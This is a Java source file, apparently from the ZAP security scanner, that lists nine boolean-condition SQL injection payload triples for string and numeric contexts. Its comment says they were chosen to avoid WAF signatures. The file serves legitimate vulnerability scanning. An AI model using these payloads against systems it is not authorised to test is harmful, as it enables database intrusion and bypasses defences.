/*
 * Zed Attack Proxy (ZAP) and its related class files.
 *
 * ZAP is an HTTP/HTTPS proxy for assessing web application security.
 *
 * Copyright 2026 The ZAP Development Team
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *     http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */
package org.zaproxy.zap.extension.ascanrules.sqli.strategies;

import java.util.List;

/**
 * Boolean condition payloads for SQL injection testing. Classic tautologies (1=1 / 1=2,
 * '1'='1' / '1'='2') were replaced with safer boolean condition pairs that are less likely to
 * be caught by WAF signatures while retaining reliable true/false page differentials.
 *
 * <p>Each triple contains an AND_TRUE, AND_FALSE, and OR_TRUE variant to support the
 * restrict→broaden fallback cascade: try AND_TRUE; if it matches baseline, try AND_FALSE; if
 * AND_FALSE also matches (empty result set), fall back to OR_TRUE.
 *
 * <p>The 9 triples cover string contexts (single/double quote, with/without trailing comment),
 * numeric contexts, and varied constructs (arithmetic comparison, BETWEEN, LIKE, IS NULL) for
 * broad DBMS portability.
 */
public class BooleanConditionPayloads {

    public record Condition(String andTrue, String andFalse, String orTrue) {}

    /** 9 boolean condition triples using safer, non-tautology boolean condition pairs. */
    public static final List<Condition> CONDITIONS =
            List.of(
                    // String context: single quote + arithmetic comparison with comment
                    new Condition(
                            "' AND 2>1 -- ",
                            "' AND 2>3 -- ",
                            "' OR 2>1 -- "),
                    // String context: double quote + arithmetic comparison with comment
                    new Condition(
                            "\" AND 2>1 -- ",
                            "\" AND 2>3 -- ",
                            "\" OR 2>1 -- "),
                    // Numeric context: arithmetic comparison with comment
                    new Condition(" AND 2>1 -- ", " AND 2>3 -- ", " OR 2>1 -- "),
                    // String context: single quote + BETWEEN without comment
                    new Condition(
                            "' AND 3 BETWEEN 2 AND 4",
                            "' AND 3 BETWEEN 5 AND 6",
                            "' OR 3 BETWEEN 2 AND 4"),
                    // String context: double quote + BETWEEN without comment
                    new Condition(
                            "\" AND 3 BETWEEN 2 AND 4",
                            "\" AND 3 BETWEEN 5 AND 6",
                            "\" OR 3 BETWEEN 2 AND 4"),
                    // Numeric context: arithmetic comparison without comment
                    new Condition(" AND 2>1", " AND 2>3", " OR 2>1"),
                    // String context: single quote + LIKE with non-obvious prefix operand
                    new Condition(
                            "' AND 'abc' LIKE 'a%",
                            "' AND 'abc' LIKE 'z%",
                            "' OR 'abc' LIKE 'a%"),
                    // Numeric context: LIKE with string literal
                    new Condition(
                            "1 AND 'abc' LIKE 'a%",
                            "1 AND 'abc' LIKE 'z%",
                            "1 OR 'abc' LIKE 'a%"),
                    // String context: single quote + IS NULL / IS NOT NULL with comment
                    new Condition(
                            "' AND NULL IS NULL -- ",
                            "' AND NULL IS NOT NULL -- ",
                            "' OR NULL IS NULL -- "));

    private BooleanConditionPayloads() {}
}
